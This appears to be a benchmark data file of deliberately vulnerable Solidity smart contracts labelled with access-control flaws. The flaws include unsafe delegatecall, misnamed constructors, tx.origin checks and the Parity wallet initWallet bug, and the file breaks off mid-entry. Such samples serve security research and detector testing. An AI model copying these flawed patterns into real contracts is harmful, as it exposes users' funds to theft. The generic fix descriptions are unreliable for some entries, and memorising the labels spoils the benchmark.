[
  {
    "id": "smartbugs_access_control_FibonacciBalance",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "FibonacciBalance.sol",
    "file_content": "/*\n * @source: https://github.com/sigp/solidity-security-blog\n * @author: Suhabe Bugrara\n * @vulnerable_at_lines: 31,38\n */\n\n//added pragma version\npragma solidity ^0.4.22;\n\ncontract FibonacciBalance {\n\n    address public fibonacciLibrary;\n    // the current fibonacci number to withdraw\n    uint public calculatedFibNumber;\n    // the starting fibonacci sequence number\n    uint public start = 3;\n    uint public withdrawalCounter;\n    // the fibonancci function selector\n    bytes4 constant fibSig = bytes4(sha3(\"setFibonacci(uint256)\"));\n\n    // constructor - loads the contract with ether\n    constructor(address _fibonacciLibrary) public payable {\n        fibonacciLibrary = _fibonacciLibrary;\n    }\n\n    function withdraw() {\n        withdrawalCounter += 1;\n        // calculate the fibonacci number for the current withdrawal user\n        // this sets calculatedFibNumber\n        // <yes> <report> ACCESS_CONTROL\n        require(fibonacciLibrary.delegatecall(fibSig, withdrawalCounter));\n        msg.sender.transfer(calculatedFibNumber * 1 ether);\n    }\n\n    // allow users to call fibonacci library functions\n    function() public {\n        // <yes> <report> ACCESS_CONTROL\n        require(fibonacciLibrary.delegatecall(msg.data));\n    }\n}\n\n// library contract - calculates fibonacci-like numbers;\ncontract FibonacciLib {\n    // initializing the standard fibonacci sequence;\n    uint public start;\n    uint public calculatedFibNumber;\n\n    // modify the zeroth number in the sequence\n    function setStart(uint _start) public {\n        start = _start;\n    }\n\n    function setFibonacci(uint n) public {\n        calculatedFibNumber = fibonacci(n);\n    }\n\n    function fibonacci(uint n) internal returns (uint) {\n        if (n == 0) return start;\n        else if (n == 1) return start + 1;\n        else return fibonacci(n - 1) + fibonacci(n - 2);\n    }\n}\n",
    "vulnerable_function": "withdraw",
    "vulnerable_lines": [
      31
    ],
    "vulnerability_type": "access_control",
    "original_category": "access_control",
    "severity": "high",
    "difficulty_tier": 1,
    "description": "Access control vulnerability - missing or incorrect authorization checks at line(s) 31",
    "fix_description": "Add proper access control modifiers (onlyOwner, require statements) or avoid tx.origin",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/access_control/FibonacciBalance.sol",
    "pragma": "0.4.22",
    "source_url": "https://github.com/sigp/solidity-security-blog"
  },
  {
    "id": "smartbugs_access_control_arbitrary_location_write_simple",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "arbitrary_location_write_simple.sol",
    "file_content": "/*\n * @source: https://smartcontractsecurity.github.io/SWC-registry/docs/SWC-124#arbitrary-location-write-simplesol\n * @author: Suhabe Bugrara\n * @vulnerable_at_lines: 27\n */\n\n pragma solidity ^0.4.25;\n\n contract Wallet {\n     uint[] private bonusCodes;\n     address private owner;\n\n     constructor() public {\n         bonusCodes = new uint[](0);\n         owner = msg.sender;\n     }\n\n     function () public payable {\n     }\n\n     function PushBonusCode(uint c) public {\n         bonusCodes.push(c);\n     }\n\n     function PopBonusCode() public {\n         // <yes> <report> ACCESS_CONTROL\n         require(0 <= bonusCodes.length); // this condition is always true since array lengths are unsigned\n         bonusCodes.length--; // an underflow can be caused here\n     }\n\n     function UpdateBonusCodeAt(uint idx, uint c) public {\n         require(idx < bonusCodes.length);\n         bonusCodes[idx] = c; // write to any index less than bonusCodes.length\n     }\n\n     function Destroy() public {\n         require(msg.sender == owner);\n         selfdestruct(msg.sender);\n     }\n }\n",
    "vulnerable_function": "PopBonusCode",
    "vulnerable_lines": [
      27
    ],
    "vulnerability_type": "access_control",
    "original_category": "access_control",
    "severity": "high",
    "difficulty_tier": 1,
    "description": "Access control vulnerability - missing or incorrect authorization checks at line(s) 27",
    "fix_description": "Add proper access control modifiers (onlyOwner, require statements) or avoid tx.origin",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/access_control/arbitrary_location_write_simple.sol",
    "pragma": "0.4.25",
    "source_url": "https://smartcontractsecurity.github.io/SWC-registry/docs/SWC-124#arbitrary-location-write-simplesol"
  },
  {
    "id": "smartbugs_access_control_incorrect_constructor_name1",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "incorrect_constructor_name1.sol",
    "file_content": "/*\n * @source: https://github.com/trailofbits/not-so-smart-contracts/blob/master/wrong_constructor_name/incorrect_constructor.sol\n * @author: Ben Perez\n * @vulnerable_at_lines: 20\n */\n\npragma solidity ^0.4.24;\n\ncontract Missing{\n    address private owner;\n\n    modifier onlyowner {\n        require(msg.sender==owner);\n        _;\n    }\n\n    // The name of the constructor should be Missing\n    // Anyone can call the IamMissing once the contract is deployed\n    // <yes> <report> ACCESS_CONTROL\n    function IamMissing()\n        public\n    {\n        owner = msg.sender;\n    }\n\n    function () payable {}\n\n    function withdraw()\n        public\n        onlyowner\n    {\n       owner.transfer(this.balance);\n    }\n}\n",
    "vulnerable_function": "IamMissing",
    "vulnerable_lines": [
      20
    ],
    "vulnerability_type": "access_control",
    "original_category": "access_control",
    "severity": "high",
    "difficulty_tier": 2,
    "description": "Access control vulnerability - missing or incorrect authorization checks at line(s) 20",
    "fix_description": "Add proper access control modifiers (onlyOwner, require statements) or avoid tx.origin",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/access_control/incorrect_constructor_name1.sol",
    "pragma": "0.4.24",
    "source_url": "https://github.com/trailofbits/not-so-smart-contracts/blob/master/wrong_constructor_name/incorrect_constructor.sol"
  },
  {
    "id": "smartbugs_access_control_incorrect_constructor_name2",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "incorrect_constructor_name2.sol",
    "file_content": "/*\n * @source: https://smartcontractsecurity.github.io/SWC-registry/docs/SWC-118#incorrect-constructor-name1sol\n * @author: Ben Perez\n * @vulnerable_at_lines: 18\n */\n\n\npragma solidity ^0.4.24;\n\ncontract Missing{\n    address private owner;\n\n    modifier onlyowner {\n        require(msg.sender==owner);\n        _;\n    }\n    // <yes> <report> ACCESS_CONTROL\n    function missing()\n        public\n    {\n        owner = msg.sender;\n    }\n\n    function () payable {}\n\n    function withdraw()\n        public\n        onlyowner\n    {\n       owner.transfer(this.balance);\n    }\n}\n",
    "vulnerable_function": "missing",
    "vulnerable_lines": [
      18
    ],
    "vulnerability_type": "access_control",
    "original_category": "access_control",
    "severity": "high",
    "difficulty_tier": 2,
    "description": "Access control vulnerability - missing or incorrect authorization checks at line(s) 18",
    "fix_description": "Add proper access control modifiers (onlyOwner, require statements) or avoid tx.origin",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/access_control/incorrect_constructor_name2.sol",
    "pragma": "0.4.24",
    "source_url": "https://smartcontractsecurity.github.io/SWC-registry/docs/SWC-118#incorrect-constructor-name1sol"
  },
  {
    "id": "smartbugs_access_control_incorrect_constructor_name3",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "incorrect_constructor_name3.sol",
    "file_content": "/*\n * @source: https://smartcontractsecurity.github.io/SWC-registry/docs/SWC-118#incorrect-constructor-name2sol\n * @author: Ben Perez\n * @vulnerable_at_lines: 17\n */\n\npragma solidity ^0.4.24;\n\ncontract Missing{\n    address private owner;\n\n    modifier onlyowner {\n        require(msg.sender==owner);\n        _;\n    }\n    // <yes> <report> ACCESS_CONTROL\n    function Constructor()\n        public\n    {\n        owner = msg.sender;\n    }\n\n    function () payable {}\n\n    function withdraw()\n        public\n        onlyowner\n    {\n       owner.transfer(this.balance);\n    }\n\n}\n",
    "vulnerable_function": "Constructor",
    "vulnerable_lines": [
      17
    ],
    "vulnerability_type": "access_control",
    "original_category": "access_control",
    "severity": "high",
    "difficulty_tier": 2,
    "description": "Access control vulnerability - missing or incorrect authorization checks at line(s) 17",
    "fix_description": "Add proper access control modifiers (onlyOwner, require statements) or avoid tx.origin",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/access_control/incorrect_constructor_name3.sol",
    "pragma": "0.4.24",
    "source_url": "https://smartcontractsecurity.github.io/SWC-registry/docs/SWC-118#incorrect-constructor-name2sol"
  },
  {
    "id": "smartbugs_access_control_mapping_write",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "mapping_write.sol",
    "file_content": "/*\n * @source: https://smartcontractsecurity.github.io/SWC-registry/docs/SWC-124#mapping-writesol\n * @author: Suhabe Bugrara\n * @vulnerable_at_lines: 20\n */\n\n pragma solidity ^0.4.24;\n\n //This code is derived from the Capture the Ether https://capturetheether.com/challenges/math/mapping/\n\n contract Map {\n     address public owner;\n     uint256[] map;\n\n     function set(uint256 key, uint256 value) public {\n         if (map.length <= key) {\n             map.length = key + 1;\n         }\n        // <yes> <report> ACCESS_CONTROL\n         map[key] = value;\n     }\n\n     function get(uint256 key) public view returns (uint256) {\n         return map[key];\n     }\n     function withdraw() public{\n       require(msg.sender == owner);\n       msg.sender.transfer(address(this).balance);\n     }\n }\n",
    "vulnerable_function": "set",
    "vulnerable_lines": [
      20
    ],
    "vulnerability_type": "access_control",
    "original_category": "access_control",
    "severity": "high",
    "difficulty_tier": 1,
    "description": "Access control vulnerability - missing or incorrect authorization checks at line(s) 20",
    "fix_description": "Add proper access control modifiers (onlyOwner, require statements) or avoid tx.origin",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/access_control/mapping_write.sol",
    "pragma": "0.4.24",
    "source_url": "https://smartcontractsecurity.github.io/SWC-registry/docs/SWC-124#mapping-writesol"
  },
  {
    "id": "smartbugs_access_control_multiowned_vulnerable",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "multiowned_vulnerable.sol",
    "file_content": "/*\n * @source: https://github.com/SmartContractSecurity/SWC-registry/blob/master/test_cases/solidity/unprotected_critical_functions/multiowned_vulnerable/multiowned_vulnerable.sol\n * @author: -\n * @vulnerable_at_lines: 38\n */\n\npragma solidity ^0.4.23;\n\n/**\n * @title MultiOwnable\n */\ncontract MultiOwnable {\n  address public root;\n  mapping (address => address) public owners; // owner => parent of owner\n\n  /**\n  * @dev The Ownable constructor sets the original `owner` of the contract to the sender\n  * account.\n  */\n  constructor() public {\n    root = msg.sender;\n    owners[root] = root;\n  }\n\n  /**\n  * @dev Throws if called by any account other than the owner.\n  */\n  modifier onlyOwner() {\n    require(owners[msg.sender] != 0);\n    _;\n  }\n\n  /**\n  * @dev Adding new owners\n  * Note that the \"onlyOwner\" modifier is missing here.\n  */\n  // <yes> <report> ACCESS_CONTROL\n  function newOwner(address _owner) external returns (bool) {\n    require(_owner != 0);\n    owners[_owner] = msg.sender;\n    return true;\n  }\n\n  /**\n    * @dev Deleting owners\n    */\n  function deleteOwner(address _owner) onlyOwner external returns (bool) {\n    require(owners[_owner] == msg.sender || (owners[_owner] != 0 && msg.sender == root));\n    owners[_owner] = 0;\n    return true;\n  }\n}\n\ncontract TestContract is MultiOwnable {\n\n  function withdrawAll() onlyOwner {\n    msg.sender.transfer(this.balance);\n  }\n\n  function() payable {\n  }\n\n}\n",
    "vulnerable_function": "newOwner",
    "vulnerable_lines": [
      38
    ],
    "vulnerability_type": "access_control",
    "original_category": "access_control",
    "severity": "high",
    "difficulty_tier": 2,
    "description": "Access control vulnerability - missing or incorrect authorization checks at line(s) 38",
    "fix_description": "Add proper access control modifiers (onlyOwner, require statements) or avoid tx.origin",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/access_control/multiowned_vulnerable.sol",
    "pragma": "0.4.23",
    "source_url": "https://github.com/SmartContractSecurity/SWC-registry/blob/master/test_cases/solidity/unprotected_critical_functions/multiowned_vulnerable/multiowned_vulnerable.sol"
  },
  {
    "id": "smartbugs_access_control_mycontract",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "mycontract.sol",
    "file_content": "/*\n * @source: https://consensys.github.io/smart-contract-best-practices/recommendations/#avoid-using-txorigin\n * @author: Consensys Diligence\n * @vulnerable_at_lines: 20\n * Modified by Gerhard Wagner\n */\n\npragma solidity ^0.4.24;\n\ncontract MyContract {\n\n    address owner;\n\n    function MyContract() public {\n        owner = msg.sender;\n    }\n\n    function sendTo(address receiver, uint amount) public {\n        // <yes> <report> ACCESS_CONTROL\n        require(tx.origin == owner);\n        receiver.transfer(amount);\n    }\n\n}\n",
    "vulnerable_function": "sendTo",
    "vulnerable_lines": [
      20
    ],
    "vulnerability_type": "access_control",
    "original_category": "access_control",
    "severity": "high",
    "difficulty_tier": 1,
    "description": "Access control vulnerability - missing or incorrect authorization checks at line(s) 20",
    "fix_description": "Add proper access control modifiers (onlyOwner, require statements) or avoid tx.origin",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/access_control/mycontract.sol",
    "pragma": "0.4.24",
    "source_url": "https://consensys.github.io/smart-contract-best-practices/recommendations/#avoid-using-txorigin"
  },
  {
    "id": "smartbugs_access_control_parity_wallet_bug_1",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "parity_wallet_bug_1.sol",
    "file_content": "/*\n * @source: https://github.com/paritytech/parity-ethereum/blob/4d08e7b0aec46443bf26547b17d10cb302672835/js/src/contracts/snippets/enhanced-wallet.sol#L216\n * @author: parity\n * @vulnerable_at_lines: 223,437\n */\n\n//sol Wallet\n// Multi-sig, daily-limited account proxy/wallet.\n// @authors:\n// Gav Wood <g@ethdev.com>\n// inheritable \"property\" contract that enables methods to be protected by requiring the acquiescence of either a\n// single, or, crucially, each of a number of, designated owners.\n// usage:\n// use modifiers onlyowner (just own owned) or onlymanyowners(hash), whereby the same hash must be provided by\n// some number (specified in constructor) of the set of owners (specified in the constructor, modifiable) before the\n// interior is executed.\n\npragma solidity 0.4.9; /* originally ^0.4.9, but doesn't compile with ^0.4.11 */\n\ncontract WalletEvents {\n  // EVENTS\n\n  // this contract only has six types of events: it can accept a confirmation, in which case\n  // we record owner and operation (hash) alongside it.\n  event Confirmation(address owner, bytes32 operation);\n  event Revoke(address owner, bytes32 operation);\n\n  // some others are in the case of an owner changing.\n  event OwnerChanged(address oldOwner, address newOwner);\n  event OwnerAdded(address newOwner);\n  event OwnerRemoved(address oldOwner);\n\n  // the last one is emitted if the required signatures change\n  event RequirementChanged(uint newRequirement);\n\n  // Funds has arrived into the wallet (record how much).\n  event Deposit(address _from, uint value);\n  // Single transaction going out of the wallet (record who signed for it, how much, and to whom it's going).\n  event SingleTransact(address owner, uint value, address to, bytes data, address created);\n  // Multi-sig transaction going out of the wallet (record who signed for it last, the operation hash, how much, and to whom it's going).\n  event MultiTransact(address owner, bytes32 operation, uint value, address to, bytes data, address created);\n  // Confirmation still needed for a transaction.\n  event ConfirmationNeeded(bytes32 operation, address initiator, uint value, address to, bytes data);\n}\n\ncontract WalletAbi {\n  // Revokes a prior confirmation of the given operation\n  function revoke(bytes32 _operation) external;\n\n  // Replaces an owner `_from` with another `_to`.\n  function changeOwner(address _from, address _to) external;\n\n  function addOwner(address _owner) external;\n\n  function removeOwner(address _owner) external;\n\n  function changeRequirement(uint _newRequired) external;\n\n  function isOwner(address _addr) constant returns (bool);\n\n  function hasConfirmed(bytes32 _operation, address _owner) external constant returns (bool);\n\n  // (re)sets the daily limit. needs many of the owners to confirm. doesn't alter the amount already spent today.\n  function setDailyLimit(uint _newLimit) external;\n\n  function execute(address _to, uint _value, bytes _data) external returns (bytes32 o_hash);\n  function confirm(bytes32 _h) returns (bool o_success);\n}\n\ncontract WalletLibrary is WalletEvents {\n  // TYPES\n\n  // struct for the status of a pending operation.\n  struct PendingState {\n    uint yetNeeded;\n    uint ownersDone;\n    uint index;\n  }\n\n  // Transaction structure to remember details of transaction lest it need be saved for a later call.\n  struct Transaction {\n    address to;\n    uint value;\n    bytes data;\n  }\n\n  // MODIFIERS\n\n  // simple single-sig function modifier.\n  modifier onlyowner {\n    if (isOwner(msg.sender))\n      _;\n  }\n  // multi-sig function modifier: the operation must have an intrinsic hash in order\n  // that later attempts can be realised as the same underlying operation and\n  // thus count as confirmations.\n  modifier onlymanyowners(bytes32 _operation) {\n    if (confirmAndCheck(_operation))\n      _;\n  }\n\n  // METHODS\n\n  // gets called when no other function matches\n  function() payable {\n    // just being sent some cash?\n    if (msg.value > 0)\n      Deposit(msg.sender, msg.value);\n  }\n\n  // constructor is given number of sigs required to do protected \"onlymanyowners\" transactions\n  // as well as the selection of addresses capable of confirming them.\n  function initMultiowned(address[] _owners, uint _required) {\n    m_numOwners = _owners.length + 1;\n    m_owners[1] = uint(msg.sender);\n    m_ownerIndex[uint(msg.sender)] = 1;\n    for (uint i = 0; i < _owners.length; ++i)\n    {\n      m_owners[2 + i] = uint(_owners[i]);\n      m_ownerIndex[uint(_owners[i])] = 2 + i;\n    }\n    m_required = _required;\n  }\n\n  // Revokes a prior confirmation of the given operation\n  function revoke(bytes32 _operation) external {\n    uint ownerIndex = m_ownerIndex[uint(msg.sender)];\n    // make sure they're an owner\n    if (ownerIndex == 0) return;\n    uint ownerIndexBit = 2**ownerIndex;\n    var pending = m_pending[_operation];\n    if (pending.ownersDone & ownerIndexBit > 0) {\n      pending.yetNeeded++;\n      pending.ownersDone -= ownerIndexBit;\n      Revoke(msg.sender, _operation);\n    }\n  }\n\n  // Replaces an owner `_from` with another `_to`.\n  function changeOwner(address _from, address _to) onlymanyowners(sha3(msg.data)) external {\n    if (isOwner(_to)) return;\n    uint ownerIndex = m_ownerIndex[uint(_from)];\n    if (ownerIndex == 0) return;\n\n    clearPending();\n    m_owners[ownerIndex] = uint(_to);\n    m_ownerIndex[uint(_from)] = 0;\n    m_ownerIndex[uint(_to)] = ownerIndex;\n    OwnerChanged(_from, _to);\n  }\n\n  function addOwner(address _owner) onlymanyowners(sha3(msg.data)) external {\n    if (isOwner(_owner)) return;\n\n    clearPending();\n    if (m_numOwners >= c_maxOwners)\n      reorganizeOwners();\n    if (m_numOwners >= c_maxOwners)\n      return;\n    m_numOwners++;\n    m_owners[m_numOwners] = uint(_owner);\n    m_ownerIndex[uint(_owner)] = m_numOwners;\n    OwnerAdded(_owner);\n  }\n\n  function removeOwner(address _owner) onlymanyowners(sha3(msg.data)) external {\n    uint ownerIndex = m_ownerIndex[uint(_owner)];\n    if (ownerIndex == 0) return;\n    if (m_required > m_numOwners - 1) return;\n\n    m_owners[ownerIndex] = 0;\n    m_ownerIndex[uint(_owner)] = 0;\n    clearPending();\n    reorganizeOwners(); //make sure m_numOwner is equal to the number of owners and always points to the optimal free slot\n    OwnerRemoved(_owner);\n  }\n\n  function changeRequirement(uint _newRequired) onlymanyowners(sha3(msg.data)) external {\n    if (_newRequired > m_numOwners) return;\n    m_required = _newRequired;\n    clearPending();\n    RequirementChanged(_newRequired);\n  }\n\n  // Gets an owner by 0-indexed position (using numOwners as the count)\n  function getOwner(uint ownerIndex) external constant returns (address) {\n    return address(m_owners[ownerIndex + 1]);\n  }\n\n  function isOwner(address _addr) constant returns (bool) {\n    return m_ownerIndex[uint(_addr)] > 0;\n  }\n\n  function hasConfirmed(bytes32 _operation, address _owner) external constant returns (bool) {\n    var pending = m_pending[_operation];\n    uint ownerIndex = m_ownerIndex[uint(_owner)];\n\n    // make sure they're an owner\n    if (ownerIndex == 0) return false;\n\n    // determine the bit to set for this owner.\n    uint ownerIndexBit = 2**ownerIndex;\n    return !(pending.ownersDone & ownerIndexBit == 0);\n  }\n\n  // constructor - stores initial daily limit and records the present day's index.\n  function initDaylimit(uint _limit) {\n    m_dailyLimit = _limit;\n    m_lastDay = today();\n  }\n  // (re)sets the daily limit. needs many of the owners to confirm. doesn't alter the amount already spent today.\n  function setDailyLimit(uint _newLimit) onlymanyowners(sha3(msg.data)) external {\n    m_dailyLimit = _newLimit;\n  }\n  // resets the amount already spent today. needs many of the owners to confirm.\n  function resetSpentToday() onlymanyowners(sha3(msg.data)) external {\n    m_spentToday = 0;\n  }\n\n  // constructor - just pass on the owner array to the multiowned and\n  // the limit to daylimit\n  // <yes> <report> ACCESS_CONTROL\n  function initWallet(address[] _owners, uint _required, uint _daylimit) {\n    initDaylimit(_daylimit);\n    initMultiowned(_owners, _required);\n  }\n\n  // kills the contract sending everything to `_to`.\n  function kill(address _to) onlymanyowners(sha3(msg.data)) external {\n    suicide(_to);\n  }\n\n  // Outside-visible transact entry point. Executes transaction immediately if below daily spend limit.\n  // If not, goes into multisig process. We provide a hash on return to allow the sender to provide\n  // shortcuts for the other confirmations (allowing them to avoid replicating the _to, _value\n  // and _data arguments). They still get the option of using them if they want, anyways.\n  function execute(address _to, uint _value, bytes _data) external onlyowner returns (bytes32 o_hash) {\n    // first, take the opportunity to check that we're under the daily limit.\n    if ((_data.length == 0 && underLimit(_value)) || m_required == 1) {\n      // yes - just execute the call.\n      address created;\n      if (_to == 0) {\n        created = create(_value, _data);\n      } else {\n        if (!_to.call.value(_value)(_data))\n          throw;\n      }\n      SingleTransact(msg.sender, _value, _to, _data, created);\n    } else {\n      // determine our operation hash.\n      o_hash = sha3(msg.data, block.number);\n      // store if it's new\n      if (m_txs[o_hash].to == 0 && m_txs[o_hash].value == 0 && m_txs[o_hash].data.length == 0) {\n        m_txs[o_hash].to = _to;\n        m_txs[o_hash].value = _value;\n        m_txs[o_hash].data = _data;\n      }\n      if (!confirm(o_hash)) {\n        ConfirmationNeeded(o_hash, msg.sender, _value, _to, _data);\n      }\n    }\n  }\n\n  function create(uint _value, bytes _code) internal returns (address o_addr) {\n    assembly {\n      o_addr := create(_value, add(_code, 0x20), mload(_code))\n      jumpi(invalidJumpLabel, iszero(extcodesize(o_addr)))\n    }\n  }\n\n  // confirm a transaction through just the hash. we use the previous transactions map, m_txs, in order\n  // to determine the body of the transaction from the hash provided.\n  function confirm(bytes32 _h) onlymanyowners(_h) returns (bool o_success) {\n    if (m_txs[_h].to != 0 || m_txs[_h].value != 0 || m_txs[_h].data.length != 0) {\n      address created;\n      if (m_txs[_h].to == 0) {\n        created = create(m_txs[_h].value, m_txs[_h].data);\n      } else {\n        if (!m_txs[_h].to.call.value(m_txs[_h].value)(m_txs[_h].data))\n          throw;\n      }\n\n      MultiTransact(msg.sender, _h, m_txs[_h].value, m_txs[_h].to, m_txs[_h].data, created);\n      delete m_txs[_h];\n      return true;\n    }\n  }\n\n  // INTERNAL METHODS\n\n  function confirmAndCheck(bytes32 _operation) internal returns (bool) {\n    // determine what index the present sender is:\n    uint ownerIndex = m_ownerIndex[uint(msg.sender)];\n    // make sure they're an owner\n    if (ownerIndex == 0) return;\n\n    var pending = m_pending[_operation];\n    // if we're not yet working on this operation, switch over and reset the confirmation status.\n    if (pending.yetNeeded == 0) {\n      // reset count of confirmations needed.\n      pending.yetNeeded = m_required;\n      // reset which owners have confirmed (none) - set our bitmap to 0.\n      pending.ownersDone = 0;\n      pending.index = m_pendingIndex.length++;\n      m_pendingIndex[pending.index] = _operation;\n    }\n    // determine the bit to set for this owner.\n    uint ownerIndexBit = 2**ownerIndex;\n    // make sure we (the message sender) haven't confirmed this operation previously.\n    if (pending.ownersDone & ownerIndexBit == 0) {\n      Confirmation(msg.sender, _operation);\n      // ok - check if count is enough to go ahead.\n      if (pending.yetNeeded <= 1) {\n        // enough confirmations: reset and run interior.\n        delete m_pendingIndex[m_pending[_operation].index];\n        delete m_pending[_operation];\n        return true;\n      }\n      else\n      {\n        // not enough: record that this owner in particular confirmed.\n        pending.yetNeeded--;\n        pending.ownersDone |= ownerIndexBit;\n      }\n    }\n  }\n\n  function reorganizeOwners() private {\n    uint free = 1;\n    while (free < m_numOwners)\n    {\n      while (free < m_numOwners && m_owners[free] != 0) free++;\n      while (m_numOwners > 1 && m_owners[m_numOwners] == 0) m_numOwners--;\n      if (free < m_numOwners && m_owners[m_numOwners] != 0 && m_owners[free] == 0)\n      {\n        m_owners[free] = m_owners[m_numOwners];\n        m_ownerIndex[m_owners[free]] = free;\n        m_owners[m_numOwners] = 0;\n      }\n    }\n  }\n\n  // checks to see if there is at least `_value` left from the daily limit today. if there is, subtracts it and\n  // returns true. otherwise just returns false.\n  function underLimit(uint _value) internal onlyowner returns (bool) {\n    // reset the spend limit if we're on a different day to last time.\n    if (today() > m_lastDay) {\n      m_spentToday = 0;\n      m_lastDay = today();\n    }\n    // check to see if there's enough left - if so, subtract and return true.\n    // overflow protection                    // dailyLimit check\n    if (m_spentToday + _value >= m_spentToday && m_spentToday + _value <= m_dailyLimit) {\n      m_spentToday += _value;\n      return true;\n    }\n    return false;\n  }\n\n  // determines today's index.\n  function today() private constant returns (uint) { return now / 1 days; }\n\n  function clearPending() internal {\n    uint length = m_pendingIndex.length;\n\n    for (uint i = 0; i < length; ++i) {\n      delete m_txs[m_pendingIndex[i]];\n\n      if (m_pendingIndex[i] != 0)\n        delete m_pending[m_pendingIndex[i]];\n    }\n\n    delete m_pendingIndex;\n  }\n\n  // FIELDS\n  address constant _walletLibrary = 0xcafecafecafecafecafecafecafecafecafecafe;\n\n  // the number of owners that must confirm the same operation before it is run.\n  uint public m_required;\n  // pointer used to find a free slot in m_owners\n  uint public m_numOwners;\n\n  uint public m_dailyLimit;\n  uint public m_spentToday;\n  uint public m_lastDay;\n\n  // list of owners\n  uint[256] m_owners;\n\n  uint constant c_maxOwners = 250;\n  // index on the list of owners to allow reverse lookup\n  mapping(uint => uint) m_ownerIndex;\n  // the ongoing operations.\n  mapping(bytes32 => PendingState) m_pending;\n  bytes32[] m_pendingIndex;\n\n  // pending transactions we have at present.\n  mapping (bytes32 => Transaction) m_txs;\n}\n\ncontract Wallet is WalletEvents {\n\n  // WALLET CONSTRUCTOR\n  //   calls the `initWallet` method of the Library in this context\n  function Wallet(address[] _owners, uint _required, uint _daylimit) {\n    // Signature of the Wallet Library's init function\n    bytes4 sig = bytes4(sha3(\"initWallet(address[],uint256,uint256)\"));\n    address target = _walletLibrary;\n\n    // Compute the size of the call data : arrays has 2\n    // 32bytes for offset and length, plus 32bytes per element ;\n    // plus 2 32bytes for each uint\n    uint argarraysize = (2 + _owners.length);\n    uint argsize = (2 + argarraysize) * 32;\n\n    assembly {\n      // Add the signature first to memory\n      mstore(0x0, sig)\n      // Add the call data, which is at the end of the\n      // code\n      codecopy(0x4,  sub(codesize, argsize), argsize)\n      // Delegate call to the library\n      delegatecall(sub(gas, 10000), target, 0x0, add(argsize, 0x4), 0x0, 0x0)\n    }\n  }\n\n  // METHODS\n\n  // gets called when no other function matches\n  function() payable {\n    // just being sent some cash?\n    if (msg.value > 0)\n      Deposit(msg.sender, msg.value);\n    else if (msg.data.length > 0)\n     // <yes> <report> ACCESS_CONTROL\n      _walletLibrary.delegatecall(msg.data); //it should have whitelisted specific methods that the user is allowed to call\n  }\n\n  // Gets an owner by 0-indexed position (using numOwners as the count)\n  function getOwner(uint ownerIndex) constant returns (address) {\n    return address(m_owners[ownerIndex + 1]);\n  }\n\n  // As return statement unavailable in fallback, explicit the method here\n\n  function hasConfirmed(bytes32 _operation, address _owner) external constant returns (bool) {\n    return _walletLibrary.delegatecall(msg.data);\n  }\n\n  function isOwner(address _addr) constant returns (bool) {\n    return _walletLibrary.delegatecall(msg.data);\n  }\n\n  // FIELDS\n  address constant _walletLibrary = 0xcafecafecafecafecafecafecafecafecafecafe;\n\n  // the number of owners that must confirm the same operation before it is run.\n  uint public m_required;\n  // pointer used to find a free slot in m_owners\n  uint public m_numOwners;\n\n  uint public m_dailyLimit;\n  uint public m_spentToday;\n  uint public m_lastDay;\n\n  // list of owners\n  uint[256] m_owners;\n}\n",
    "vulnerable_function": "initWallet",
    "vulnerable_lines": [
      223
    ],
    "vulnerability_type": "access_control",
    "original_category": "access_control",
    "severity": "high",
    "difficulty_tier": 3,
    "description": "Access control vulnerability - missing or incorrect authorization checks at line(s) 223",
    "fix_description": "Add proper access control modifiers (onlyOwner, require statements) or avoid tx.origin",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/access_control/parity_wallet_bug_1.sol",
    "pragma": "0.4.9",
    "source_url": "https://github.com/paritytech/parity-ethereum/blob/4d08e7b0aec46443bf26547b17d10cb302672835/js/src/contracts/snippets/enhanced-wallet.sol#L216"
  },
  {
    "id": "smartbugs_access_control_parity_wallet_bug_2",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "parity_wallet_bug_2.sol",
    "file_content": "/*\n * @source: https://smartcontractsecurity.github.io/SWC-registry/docs/SWC-106#walletlibrarysol\n * @author: -\n * @vulnerable_at_lines: 226,233\n */\n\n//sol Wallet\n// Multi-sig, daily-limited account proxy/wallet.\n// @authors:\n// Gav Wood <g@ethdev.com>\n// inheritable \"property\" contract that enables methods to be protected by requiring the acquiescence of either a\n// single, or, crucially, each of a number of, designated owners.\n// usage:\n// use modifiers onlyowner (just own owned) or onlymanyowners(hash), whereby the same hash must be provided by\n// some number (specified in constructor) of the set of owners (specified in the constructor, modifiable) before the\n// interior is executed.\n\npragma solidity ^0.4.9;\n\ncontract WalletEvents {\n  // EVENTS\n\n  // this contract only has six types of events: it can accept a confirmation, in which case\n  // we record owner and operation (hash) alongside it.\n  event Confirmation(address owner, bytes32 operation);\n  event Revoke(address owner, bytes32 operation);\n\n  // some others are in the case of an owner changing.\n  event OwnerChanged(address oldOwner, address newOwner);\n  event OwnerAdded(address newOwner);\n  event OwnerRemoved(address oldOwner);\n\n  // the last one is emitted if the required signatures change\n  event RequirementChanged(uint newRequirement);\n\n  // Funds has arrived into the wallet (record how much).\n  event Deposit(address _from, uint value);\n  // Single transaction going out of the wallet (record who signed for it, how much, and to whom it's going).\n  event SingleTransact(address owner, uint value, address to, bytes data, address created);\n  // Multi-sig transaction going out of the wallet (record who signed for it last, 